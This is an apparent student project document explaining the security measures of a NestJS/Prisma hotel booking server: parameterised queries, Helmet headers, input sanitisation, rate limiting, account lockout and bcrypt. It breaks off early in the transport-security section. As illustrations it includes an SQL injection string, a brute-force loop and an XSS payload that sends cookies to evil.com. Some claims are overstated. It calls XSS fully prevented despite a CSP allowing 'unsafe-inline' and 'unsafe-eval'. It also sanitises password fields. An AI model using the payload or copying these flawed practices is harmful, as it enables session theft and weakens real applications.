# Security Implementation Documentation

This document provides detailed explanations of security implementations in the AHomeVilla Hotel Booking Server application, designed for the Security in Mobile Development final project.

---

## Table of Contents

1. [Protection Against SQL Injection](#1-protection-against-sql-injection)
2. [Protection Against XSS (Cross-Site Scripting)](#2-protection-against-xss-cross-site-scripting)
3. [Protection Against Password-Guessing Attacks](#3-protection-against-password-guessing-attacks)
4. [Ensuring Data Security During Transmission](#4-ensuring-data-security-during-transmission)

---

## 1. Protection Against SQL Injection

### 1.1 What is SQL Injection?

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not properly sanitized before being included in SQL queries.

**Example of a vulnerable query (raw SQL):**

```sql
-- If user inputs: ' OR '1'='1' --
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'anything'
```

This would return all users because `'1'='1'` is always true, and `--` comments out the password check.

### 1.2 How Prisma ORM Protects Against SQL Injection

Prisma ORM, which we use in this project, provides **automatic protection** against SQL injection through **parameterized queries**. This is the industry-standard method for preventing SQL injection attacks.

#### 1.2.1 Parameterized Queries Explained

When you use Prisma Client methods like `findMany`, `findFirst`, `create`, `update`, etc., Prisma automatically:

1. **Separates SQL structure from data**: The SQL query structure is defined separately from the user-provided values
2. **Escapes all input values**: User inputs are treated as data, not as part of the SQL command
3. **Uses prepared statements**: The database receives the query template first, then the values separately

#### 1.2.2 Code Examples from Our Project

**Example 1: User Authentication (login.service.ts)**

```typescript
// File: src/modules/users/users.service.ts

async findOne(value: string, type: 'email' | 'phone') {
  return await this.databaseService.user.findFirst({
    where: {
      [type]: value,  // User input is passed as a value, not concatenated into SQL
    },
  });
}
```

**What Prisma generates internally:**

```sql
-- PostgreSQL parameterized query
SELECT * FROM "User" WHERE "email" = $1
-- Parameter: $1 = 'user-input-here'
```

Even if an attacker inputs `' OR '1'='1' --`, Prisma treats the entire string as a literal value:

```sql
SELECT * FROM "User" WHERE "email" = $1
-- Parameter: $1 = "' OR '1'='1' --"  (treated as literal string, not SQL code)
```

**Example 2: User Existence Check (users.service.ts)**

```typescript
// File: src/modules/users/users.service.ts

isUserExisted = async (email: string, phone: string) => {
  const existedUser = await this.databaseService.user.findFirst({
    where: {
      OR: [
        { email },   // Parameterized
        { phone },   // Parameterized
      ],
    },
  });
  return !!existedUser;
};
```

**Generated SQL (conceptual):**

```sql
SELECT * FROM "User" WHERE ("email" = $1 OR "phone" = $2) LIMIT 1
-- Parameters: $1 = email_value, $2 = phone_value
```

**Example 3: Creating a User (users.service.ts)**

```typescript
// File: src/modules/users/users.service.ts

const createdUser = await this.databaseService.user.create({
  data: {
    email: createUserDto.email,      // Parameterized
    phone: createUserDto.phone,      // Parameterized
    password: hashedPassword,        // Parameterized
    name: createUserDto.name,        // Parameterized
  },
});
```

**Generated SQL (conceptual):**

```sql
INSERT INTO "User" ("email", "phone", "password", "name") 
VALUES ($1, $2, $3, $4) 
RETURNING *
-- Parameters: $1 = email, $2 = phone, $3 = hashed_password, $4 = name
```

#### 1.2.3 Why Parameterized Queries Are Safe

| Aspect | String Concatenation (Unsafe) | Parameterized Queries (Safe) |
|--------|------------------------------|------------------------------|
| **Query Construction** | `"SELECT * FROM users WHERE email = '" + userInput + "'"` | `SELECT * FROM users WHERE email = $1` |
| **Injection Attempt** | `' OR '1'='1' --` becomes part of SQL | `' OR '1'='1' --` is treated as a literal string |
| **Database Interpretation** | Executes injected SQL code | Searches for email literally containing `' OR '1'='1' --` |
| **Result** | Returns all users (security breach) | Returns no users (expected behavior) |

#### 1.2.4 Prisma's Raw Query Safety

When you need to use raw SQL, Prisma still provides protection:

**Safe approach with `$queryRaw` (tagged template literal):**

```typescript
// Safe - Prisma escapes the variables automatically
const email = userInput;
const users = await prisma.$queryRaw`
  SELECT * FROM "User" WHERE email = ${email}
`;
```

**Safe approach with `$queryRawUnsafe` (parameterized):**

```typescript
// Safe - Using parameter placeholders
const email = userInput;
const users = await prisma.$queryRawUnsafe(
  'SELECT * FROM "User" WHERE email = $1',
  email  // Passed as parameter, not concatenated
);
```

**Unsafe approach (NEVER DO THIS):**

```typescript
// UNSAFE - String concatenation allows SQL injection
const email = userInput;
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM "User" WHERE email = '${email}'`  // DON'T DO THIS!
);
```

### 1.3 Additional Validation Layer

Beyond Prisma's built-in protection, our project adds input validation using `class-validator`:

```typescript
// File: src/modules/auth/dtos/login.dto.ts

export class LoginDto {
  @Sanitize()  // Strips HTML/script tags
  @IsString()
  @IsNotEmpty()
  @Matches(/^([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})$|^(\+?\d{10,12})$/)
  emailOrPhone: string;

  @IsString()
  @IsNotEmpty()
  @MinLength(8)
  password: string;
}
```

This provides **defense in depth**:
1. **First layer**: Input validation (reject malformed input)
2. **Second layer**: Parameterized queries (escape any remaining dangerous characters)

### 1.4 Summary

| Protection Mechanism | Implementation | Location |
|---------------------|----------------|----------|
| **Parameterized Queries** | Automatic via Prisma ORM | All database operations |
| **Input Validation** | `class-validator` decorators | DTOs (Data Transfer Objects) |
| **Input Sanitization** | Custom `@Sanitize()` decorator | User-facing DTOs |

**Key Takeaway**: By using Prisma ORM's query methods (`findMany`, `findFirst`, `create`, `update`, `delete`), all user inputs are automatically parameterized and escaped, making SQL injection attacks impossible through the ORM layer.

---

## 2. Protection Against XSS (Cross-Site Scripting)

### 2.1 What is XSS?

**Cross-Site Scripting (XSS)** is a security attack where malicious JavaScript code is injected into a web application. When other users access the infected page, the malicious code executes in their browser.

#### Types of XSS Attacks:

| Type | Description | Example |
|------|-------------|---------|
| **Stored XSS** | Malicious code is saved to database and displayed to all users | Comment containing `<script>` |
| **Reflected XSS** | Malicious code is injected via URL or form input | URL with `?name=<script>alert(1)</script>` |
| **DOM-based XSS** | Malicious code manipulates client-side DOM | Unsafe JavaScript processing user input |

#### Example XSS Attack:

```javascript
// Attacker enters hotel name like this:
const maliciousName = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';

// If not sanitized, when rendered as HTML:
// <h1>Welcome to <script>document.location="http://evil.com/steal?cookie="+document.cookie</script></h1>
// → Browser executes the script and sends cookies to attacker's server!
```

### 2.2 Multi-Layer Defense System (Defense in Depth)

Our project implements **Defense in Depth** to protect against XSS:

```
┌────────────────────────────────────────────────────────────────────┐
│                        USER INPUT                                   │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 1: HTTP Security Headers (Helmet)                          │
│  ├─ Content-Security-Policy: Controls resource sources            │
│  ├─ X-XSS-Protection: Activates browser XSS filter                │
│  ├─ X-Content-Type-Options: Prevents MIME type sniffing           │
│  └─ X-Frame-Options: Prevents clickjacking                        │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 2: Input Sanitization (@Sanitize() decorator)              │
│  ├─ Removes all HTML tags                                          │
│  ├─ Disables JavaScript injection                                  │
│  └─ Preserves safe text content                                    │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 3: Input Validation (class-validator)                       │
│  ├─ Type checking                                                  │
│  ├─ Length constraints                                             │
│  └─ Format validation (email, phone, etc.)                         │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                    SAFE DATA → Database                            │
└────────────────────────────────────────────────────────────────────┘
```

### 2.3 Layer 1: HTTP Security Headers with Helmet

#### Configuration in `src/main.ts`:

```typescript
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Security middleware - Helmet sets various HTTP headers for security
  app.use(
    helmet({
      // Content Security Policy - prevents XSS attacks
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
          imgSrc: ["'self'", 'data:', 'https:'],
        },
      },
      // HTTP Strict Transport Security - forces HTTPS
      hsts: {
        maxAge: 31536000, // 1 year in seconds
        includeSubDomains: true,
        preload: true,
      },
      // Prevent clickjacking
      frameguard: { action: 'deny' },
      // Prevent MIME type sniffing
      noSniff: true,
      // XSS filter
      xssFilter: true,
      // Hide X-Powered-By header
      hidePoweredBy: true,
    }),
  );
  // ... rest of bootstrap
}
```

#### Security Headers Explained:

| Header | Value | Purpose |
|--------|-------|---------|
| **Content-Security-Policy** | `default-src 'self'` | Only allow resources from same origin |
| **X-XSS-Protection** | `1; mode=block` | Enable browser XSS filter, block page if XSS detected |
| **X-Content-Type-Options** | `nosniff` | Prevent MIME type guessing (blocks script injection via file upload) |
| **X-Frame-Options** | `DENY` | Disallow embedding page in iframe (prevents clickjacking) |
| **Strict-Transport-Security** | `max-age=31536000` | Force HTTPS for 1 year |
| **X-Powered-By** | *Removed* | Hide framework info (Express/NestJS) |

#### Actual HTTP Response Headers:

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https:
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### 2.4 Layer 2: Input Sanitization with @Sanitize() Decorator

#### File `src/common/transformers/sanitize.transformer.ts`:

```typescript
import { Transform, TransformFnParams } from 'class-transformer';
import sanitizeHtml from 'sanitize-html';

/**
 * Options for HTML sanitization
 */
const sanitizeOptions: sanitizeHtml.IOptions = {
  allowedTags: [], // Strip all HTML tags by default
  allowedAttributes: {},
  disallowedTagsMode: 'discard',
};

/**
 * Sanitizes a string value by removing all HTML tags and dangerous content.
 */
export function sanitizeString(value: unknown): unknown {
  if (typeof value === 'string') {
    return sanitizeHtml(value.trim(), sanitizeOptions);
  }
  return value;
}

/**
 * Decorator that sanitizes string input by removing HTML tags and XSS vectors.
 * Apply to DTO properties that accept user input.
 */
export function Sanitize(): PropertyDecorator {
  return Transform(({ value }: TransformFnParams) => sanitizeString(value));
}

/**
 * Decorator that allows specific safe HTML tags.
 * Use for fields that may contain formatted content.
 */
export function SanitizeHtml(
  allowedTags: string[] = ['b', 'i', 'em', 'strong', 'p', 'br'],
): PropertyDecorator {
  return Transform(({ value }: TransformFnParams) => {
    if (typeof value === 'string') {
      return sanitizeHtml(value.trim(), {
        allowedTags,
        allowedAttributes: {},
        disallowedTagsMode: 'discard',
      });
    }
    return value;
  });
}
```

#### How sanitize-html Works:

```
INPUT: "<script>alert('XSS')</script>Hello <b>World</b>"
                              │
                              ▼
                    ┌─────────────────┐
                    │  sanitize-html  │
                    │                 │
                    │ allowedTags: [] │  ← No tags allowed
                    └─────────────────┘
                              │
                              ▼
OUTPUT: "Hello World"  ← Only safe plain text remains
```

#### Example with @SanitizeHtml (allowing some tags):

```
INPUT: "<script>alert('XSS')</script><b>Bold</b> and <i>italic</i><div>blocked</div>"
                              │
                              ▼
                    ┌─────────────────────────────────┐
                    │  sanitize-html                  │
                    │                                 │
                    │ allowedTags: ['b', 'i', 'em',   │
                    │              'strong', 'p', 'br']│
                    └─────────────────────────────────┘
                              │
                              ▼
OUTPUT: "<b>Bold</b> and <i>italic</i>blocked"  
        ↑                                  ↑
        <b>, <i> preserved                 <div> removed
```

### 2.5 Practical Application in DTOs

#### File `src/modules/auth/dtos/login.dto.ts`:

```typescript
import { Sanitize } from '@common/decorators';

export class LoginDto {
  @Sanitize()  // ← Removes HTML/script before processing
  @IsString()
  @IsNotEmpty()
  @ApiProperty({ example: 'admin' })
  identifier: string;

  @Sanitize()  // ← Protects password field too
  @IsString()
  @IsNotEmpty()
  @ApiProperty({ example: '123456aA@' })
  password: string;
}
```

#### File `src/modules/users/dtos/create-user.dto.ts`:

```typescript
import { Sanitize } from '@common/decorators';

export class CreateUserDto {
  @Sanitize()  // ← Sanitize email input
  @IsEmail()
  @ApiProperty({ example: 'admin@gmail.com' })
  email: string;

  @Sanitize()  // ← Sanitize username
  @IsString()
  @IsNotEmpty()
  @ApiProperty({ example: 'admin' })
  username: string;

  @Sanitize()  // ← Sanitize password
  @IsString()
  @IsNotEmpty()
  @Matches(PASSWORD_REGEX, {
    message: 'Password must contain uppercase, lowercase, number and special character',
  })
  @ApiProperty({ example: '123456aA@' })
  password: string;

  // ... other fields
}
```

### 2.6 Request Processing Pipeline in NestJS

```
┌─────────────────────────────────────────────────────────────────┐
│                         HTTP Request                             │
│     POST /api/auth/login                                        │
│     Body: { "identifier": "<script>evil()</script>", ... }      │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         Helmet Middleware                        │
│     → Adds security headers to response                         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         ValidationPipe                           │
│     transform: true  → Activates class-transformer              │
│     whitelist: true  → Removes undefined properties             │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    class-transformer                             │
│     @Sanitize() decorator executes                              │
│     "<script>evil()</script>" → "" (empty string)               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                     class-validator                              │
│     @IsString(), @IsNotEmpty(), etc.                            │
│     → Validates sanitized data                                  │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                        Controller                                │
│     Receives DTO with safe data                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.7 ValidationPipe Configuration in `src/main.ts`:

```typescript
app.useGlobalPipes(
  new ValidationPipe({
    transform: true,   // ← REQUIRED for @Sanitize() to work
    whitelist: true,   // ← Removes properties not defined in DTO
  }),
);
```

| Option | Value | Purpose |
|--------|-------|---------|
| `transform` | `true` | Activates class-transformer, allowing @Sanitize() decorator to run |
| `whitelist` | `true` | Automatically strips properties not defined in DTO (prevents injection via extra fields) |

### 2.8 Before and After Protection Comparison

#### Case 1: Without Protection (DANGEROUS ❌)

```typescript
// ❌ Not using @Sanitize()
export class LoginDto {
  @IsString()
  identifier: string;
}

// Input: { identifier: "<script>steal()</script>admin" }
// Stored in database: "<script>steal()</script>admin"
// → When displayed on frontend: Script may execute!
```

#### Case 2: With Protection (SAFE ✅)

```typescript
// ✅ Using @Sanitize()
export class LoginDto {
  @Sanitize()
  @IsString()
  identifier: string;
}

// Input: { identifier: "<script>steal()</script>admin" }
// After sanitize: "admin"
// Stored in database: "admin"
// → Safe to display!
```

### 2.9 XSS Protection Summary

| Layer | Technology | Function |
|-------|------------|----------|
| **HTTP Headers** | Helmet | CSP, XSS Filter, noSniff, frameguard |
| **Input Sanitization** | sanitize-html + @Sanitize() | Removes HTML/Script from input |
| **Input Validation** | class-validator | Validates format and constraints |
| **Whitelist** | ValidationPipe | Removes unknown properties |

**Result:** All user input is sanitized before processing, completely preventing XSS attacks.

---

## 3. Protection Against Password-Guessing Attacks

### 3.1 What are Password-Guessing Attacks?

**Password-guessing attacks** are attempts to gain unauthorized access by trying multiple password combinations. These attacks include:

| Attack Type | Description | Example |
|-------------|-------------|---------|
| **Brute Force** | Trying every possible combination | `a`, `aa`, `aaa`, `aaaa`... |
| **Dictionary Attack** | Using common passwords | `password123`, `admin`, `qwerty` |
| **Credential Stuffing** | Using leaked password databases | Passwords from data breaches |
| **Rainbow Table** | Using precomputed hash tables | Hash → Password lookup |

#### Attack Scenario:

```
Attacker Script:
┌────────────────────────────────────────────────────────────────┐
│  for password in ["123456", "password", "admin123", ...]:      │
│      response = login("victim@email.com", password)            │
│      if response.status == 200:                                │
│          print(f"Found password: {password}")                  │
│          break                                                 │
└────────────────────────────────────────────────────────────────┘
```

Without protection, attackers can try thousands of passwords per second!

### 3.2 Multi-Layer Defense System

Our project implements **4 layers of protection** against password-guessing:

```
┌────────────────────────────────────────────────────────────────────┐
│                    LOGIN ATTEMPT                                    │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 1: Rate Limiting (ThrottlerGuard)                          │
│  └─ 5 requests per 15 minutes per IP                              │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 2: Account Lockout (AccountLockoutService)                 │
│  └─ 5 failed attempts → 15 minute lockout per account             │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 3: Password Complexity Requirements                        │
│  └─ 8+ chars, uppercase, lowercase, number, special char          │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│  LAYER 4: Secure Password Hashing (bcrypt)                        │
│  └─ Salt rounds: 10, impossible to reverse                        │
└────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                    AUTHENTICATION RESULT                           │
└────────────────────────────────────────────────────────────────────┘
```

### 3.3 Layer 1: Rate Limiting with @nestjs/throttler

#### Configuration in `src/modules/auth/auth.module.ts`:

```typescript
import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    // ... other imports
    ThrottlerModule.forRoot([
      {
        name: 'login',        // Specific name for login limits
        ttl: 15 * 60 * 1000,  // 15 minutes window
        limit: 5,             // Maximum 5 attempts
      },
    ]),
  ],
  // ...
})
export class AuthModule {}
```

#### Custom Throttler Guard in `src/modules/auth/guards/login-throttler.guard.ts`:

```typescript
import { Injectable } from '@nestjs/common';
import { ThrottlerGuard } from '@nestjs/throttler';

@Injectable()
export class LoginThrottlerGuard extends ThrottlerGuard {
  protected async getTracker(req: Record<string, any>): Promise<string> {
    return `login_${req.ip}`;  // Track login attempts by IP address
  }

  protected errorMessage = 'Too many login attempts. Please try again later.';
}
```

#### Applying Guard in `src/modules/auth/auth.controller.ts`:

```typescript
import { LoginThrottlerGuard } from './guards';

@Controller('auth')
export class AuthController {
  
  @Post('login')
  @UseGuards(LoginThrottlerGuard)  // ← Rate limit applied here
  async login(@Body() loginDto: LoginDto) {
    return this.authService.authenticate(loginDto);
  }
}
```

#### How Rate Limiting Works:

```
Timeline (15-minute window):
═══════════════════════════════════════════════════════════════════

IP: 192.168.1.100

Request 1: ✅ Allowed (1/5)
Request 2: ✅ Allowed (2/5)
Request 3: ✅ Allowed (3/5)
Request 4: ✅ Allowed (4/5)
Request 5: ✅ Allowed (5/5)
Request 6: ❌ BLOCKED - HTTP 429 Too Many Requests

... wait 15 minutes ...

Request 7: ✅ Allowed (1/5) - Counter reset
```

### 3.4 Layer 2: Account Lockout with Redis

#### Configuration in `src/modules/auth/services/account-lockout.service.ts`:

```typescript
/**
 * Configuration for account lockout
 */
export const LOCKOUT_CONFIG = {
  /** Maximum failed attempts before lockout */
  MAX_FAILED_ATTEMPTS: 5,
  /** Lockout duration in milliseconds (15 minutes) */
  LOCKOUT_DURATION_MS: 15 * 60 * 1000,
  /** Window for counting failed attempts in milliseconds (30 minutes) */
  ATTEMPT_WINDOW_MS: 30 * 60 * 1000,
  /** Cache key prefix for failed attempts */
  FAILED_ATTEMPTS_PREFIX: 'auth:failed_attempts:',
  /** Cache key prefix for lockout */
  LOCKOUT_PREFIX: 'auth:lockout:',
} as const;
```

#### AccountLockoutService Implementation:

```typescript
@Injectable()
export class AccountLockoutService {
  constructor(@Inject(CACHE_MANAGER) private readonly cache: Cache) {}

  /**
   * Records a failed login attempt and locks the account if threshold is reached
   */
  async recordFailedAttempt(identifier: string): Promise<LockoutStatus> {
    const failedAttemptsKey = this.getFailedAttemptsKey(identifier);

    // Get current failed attempts
    const currentAttempts = (await this.cache.get<number>(failedAttemptsKey)) ?? 0;
    const newAttempts = currentAttempts + 1;

    // Update failed attempts counter in Redis
    await this.cache.set(failedAttemptsKey, newAttempts, LOCKOUT_CONFIG.ATTEMPT_WINDOW_MS);

    // Check if we should lock the account
    if (newAttempts >= LOCKOUT_CONFIG.MAX_FAILED_ATTEMPTS) {
      await this.lockAccount(identifier);
    }

    return this.getLockoutStatus(identifier);
  }

  /**
   * Clears failed attempts and lockout on successful login
   */
  async clearLockout(identifier: string): Promise<void> {
    const failedAttemptsKey = this.getFailedAttemptsKey(identifier);
    const lockoutKey = this.getLockoutKey(identifier);

    await Promise.all([
      this.cache.del(failedAttemptsKey),
      this.cache.del(lockoutKey)
    ]);
  }

  /**
   * Checks if an account is currently locked out
   */
  async isLocked(identifier: string): Promise<boolean> {
    const lockoutKey = this.getLockoutKey(identifier);
    const lockoutTime = await this.cache.get<number>(lockoutKey);
    return lockoutTime !== null && lockoutTime !== undefined;
  }
}
```

#### Integration in `src/modules/auth/auth.service.ts`:

```typescript
@Injectable()
export class AuthService {
  constructor(
    private readonly loginService: LoginService,
    private readonly accountLockoutService: AccountLockoutService,
    // ... other services
  ) {}

  async authenticate(loginDto: LoginDto) {
    const identifier = loginDto.emailOrPhone;

    // STEP 1: Check if account is locked
    const lockoutStatus = await this.accountLockoutService.getLockoutStatus(identifier);
    if (lockoutStatus.isLocked) {
      const remainingMinutes = Math.ceil(
        (lockoutStatus.lockoutEndsAt.getTime() - Date.now()) / 60000,
      );
      throw new HttpException(
        {
          status: HttpStatus.TOO_MANY_REQUESTS,
          message: `Account is temporarily locked. Please try again in ${remainingMinutes} minutes.`,
          lockoutEndsAt: lockoutStatus.lockoutEndsAt,
        },
        HttpStatus.TOO_MANY_REQUESTS,
      );
    }

    try {
      // STEP 2: Attempt login
      const user = await this.loginService.validateLogin(
        loginDto.emailOrPhone, 
        loginDto.password
      );

      // STEP 3: Clear lockout on SUCCESS
      await this.accountLockoutService.clearLockout(identifier);

      // Generate tokens...
      return { accessToken, refreshToken };

    } catch (error) {
      // STEP 4: Record failed attempt on WRONG PASSWORD
      if (error.message === AuthErrorMessageEnum.WrongUsernameOrPassword) {
        const updatedStatus = await this.accountLockoutService.recordFailedAttempt(identifier);

        throw new HttpException({
          ...error.getResponse(),
          remainingAttempts: updatedStatus.remainingAttempts,
          isLocked: updatedStatus.isLocked,
        }, error.getStatus());
      }
      throw error;
    }
  }
}
```

#### Account Lockout Flow Diagram:

```
┌─────────────────────────────────────────────────────────────────────┐
│                      LOGIN ATTEMPT                                   │
│                  user@example.com                                    │
└─────────────────────────────────────────────────────────────────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Is Account Locked?│
                    └───────────────────┘
                              │
              ┌───────────────┴───────────────┐
              │ YES                           │ NO
              ▼                               ▼
     ┌─────────────────┐            ┌─────────────────┐
     │ Return 429 Error│            │ Validate Login  │
     │ "Account locked"│            └─────────────────┘
     └─────────────────┘                      │
                                    ┌─────────┴─────────┐
                                    │ SUCCESS           │ FAILED
                                    ▼                   ▼
                         ┌────────────────┐  ┌────────────────────┐
                         │ Clear Lockout  │  │ Record Failed      │
                         │ Return Tokens  │  │ Attempt            │
                         └────────────────┘  └────────────────────┘
                                                        │
                                              ┌─────────┴─────────┐
                                              │ attempts >= 5?    │
                                              ▼                   ▼
                                        ┌─────────┐         ┌─────────┐
                                        │ YES     │         │ NO      │
                                        │ Lock    │         │ Return  │
                                        │ Account │         │ Error   │
                                        └─────────┘         └─────────┘
```

#### Redis Data Structure:

```
Redis Keys for user@example.com:
═══════════════════════════════════════════════════════════════════

Key: auth:failed_attempts:user@example.com
Value: 3
TTL: 1800 seconds (30 minutes)

Key: auth:lockout:user@example.com
Value: 1703760000000 (timestamp when lockout ends)
TTL: 900 seconds (15 minutes)
```

### 3.5 Layer 3: Password Complexity Requirements

#### Configuration in `src/modules/users/dtos/create-user.dto.ts`:

```typescript
/**
 * Password complexity regex:
 * - At least 8 characters
 * - At least 1 uppercase letter
 * - At least 1 lowercase letter  
 * - At least 1 number
 * - At least 1 special character (@$!%*?&)
 */
const PASSWORD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/;
const PASSWORD_MESSAGE =
  'Password must be at least 8 characters and contain at least 1 uppercase letter, ' +
  '1 lowercase letter, 1 number and 1 special character (@$!%*?&)';

export class CreateUserDto {
  @IsString()
  @MinLength(8)
  @Matches(PASSWORD_REGEX, { message: PASSWORD_MESSAGE })
  password: string;
}
```

#### Password Complexity Breakdown:

| Requirement | Regex Part | Example |
|-------------|------------|---------|
| Minimum 8 characters | `{8,}` | `abcd1234` |
| At least 1 lowercase | `(?=.*[a-z])` | `a` |
| At least 1 uppercase | `(?=.*[A-Z])` | `A` |
| At least 1 number | `(?=.*\d)` | `1` |
| At least 1 special char | `(?=.*[@$!%*?&])` | `@` |

#### Why Password Complexity Matters:

| Password Type | Possible Combinations | Time to Crack |
|---------------|----------------------|---------------|
| 6 lowercase letters | 26^6 = 308 million | < 1 second |
| 8 mixed case + numbers | 62^8 = 218 trillion | ~1 year |
| 8+ with special chars | 95^8 = 6.6 quadrillion | ~centuries |

### 3.6 Layer 4: Secure Password Hashing with bcrypt

#### Implementation in `libs/common/utils/funcs.ts`:

```typescript
import { genSalt, hash } from 'bcryptjs';

const saltRounds = 10;  // Cost factor - higher = more secure but slower

export async function hashPassword(plainPassword: string): Promise<string> {
  const salt = await genSalt(saltRounds);
  return await hash(plainPassword, salt);
}
```

#### Password Verification in `src/modules/auth/services/login.service.ts`:

```typescript
import { compare } from 'bcryptjs';

@Injectable()
export class LoginService {
  
  async comparePassword(password: string, hashPassword: string): Promise<boolean> {
    return await compare(password, hashPassword);  // bcrypt comparison
  }

  async validateLogin(emailOrPhone: string, password: string) {
    const user = await this.findUserOrThrow(emailOrPhone, fieldInput);

    // Compare password using bcrypt
    const isPasswordMatched = await this.comparePassword(password, user.password);

    if (!isPasswordMatched) {
      throw new HttpException({
        status: HttpStatus.UNPROCESSABLE_ENTITY,
        message: AuthErrorMessageEnum.WrongUsernameOrPassword,
      }, HttpStatus.UNPROCESSABLE_ENTITY);
    }

    return user;
  }
}
```

#### How bcrypt Works:

```
┌────────────────────────────────────────────────────────────────────┐
│                    REGISTRATION                                     │
└────────────────────────────────────────────────────────────────────┘

Password: "SecurePass123!"
              │
              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 1: Generate Random Salt                                       │
│  Salt: "$2b$10$N9qo8uLOickgx2ZMRZoMye"                              │
└─────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 2: Hash Password + Salt (10 rounds)                          │
│  Hash: "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"│
└─────────────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Step 3: Store in Database                                          │
│  user.password = "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad..." │
└─────────────────────────────────────────────────────────────────────┘


┌────────────────────────────────────────────────────────────────────┐
│                    LOGIN VERIFICATION                               │
└────────────────────────────────────────────────────────────────────┘

Input Password: "SecurePass123!"
Stored Hash: "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
              │
              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  bcrypt.compare() extracts salt from stored hash                    │
│  Re-hashes input with same salt                                     │
│  Compares results                                                   │
└─────────────────────────────────────────────────────────────────────┘
              │
              ▼
         ┌────────────┐
         │  MATCH?    │
         └────────────┘
         YES ↓    ↓ NO
         ✅ Login  ❌ Reject
```

#### bcrypt Hash Structure:

```
$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
│ │  │ │                      │                                │
│ │  │ └──────────────────────┴────────────────────────────────┘
│ │  │              22-char Salt + 31-char Hash
│ │  │
│ │  └─ Cost factor (10 rounds = 2^10 iterations)
│ │
│ └─── bcrypt version (2b)
│
└───── Algorithm identifier ($)
```

#### Why bcrypt is Secure:

| Feature | Description | Benefit |
|---------|-------------|---------|
| **Salt** | Random value added to each password | Prevents rainbow table attacks |
| **Cost Factor** | Configurable work factor (10 = 2^10 iterations) | Slows down brute force |
| **One-Way** | Cannot reverse hash to get password | Even with database access, passwords are safe |
| **Adaptive** | Can increase cost as hardware improves | Future-proof security |

### 3.7 Difference: Rate Limiting vs Account Lockout

| Feature | Rate Limiting (Throttler) | Account Lockout |
|---------|---------------------------|-----------------|
| **Tracks by** | IP Address | Account (email/phone) |
| **Purpose** | Prevent automated attacks from single IP | Protect specific accounts |
| **Bypass** | Use different IP/VPN | Cannot bypass (account-based) |
| **Use Case** | Stop bots | Stop targeted attacks |

Both work together for comprehensive protection!

### 3.8 Password-Guessing Protection Summary

| Layer | Technology | Configuration |
|-------|------------|---------------|
| **Rate Limiting** | @nestjs/throttler | 5 requests / 15 min per IP |
| **Account Lockout** | Redis + Custom Service | 5 failed attempts → 15 min lock |
| **Password Complexity** | class-validator + Regex | 8+ chars, mixed case, number, special |
| **Password Hashing** | bcryptjs | Salt rounds: 10 |

**Result:** Multiple layers of protection make brute force attacks practically impossible, while legitimate users can still access their accounts.

---

## 4. Ensuring Data Security During Transmission

### 4.1 Why Data Transmission Security Matters

When data travels between a mobile app and a server, it passes through many networks (Wi-Fi, cellular, internet routers). Without protection, attackers can:

| Attack Type | Description | Impact |
|-------------|-------------|--------|
| **Man-in-the-Middle (MITM)** | Intercept and read data in transit | Steal passwords, tokens, personal info |
| **Eavesdropping** | Passively listen to network traffic | Capture sensitive data |
| **Session Hijacking** | Steal authentication tokens | Take over user accounts |
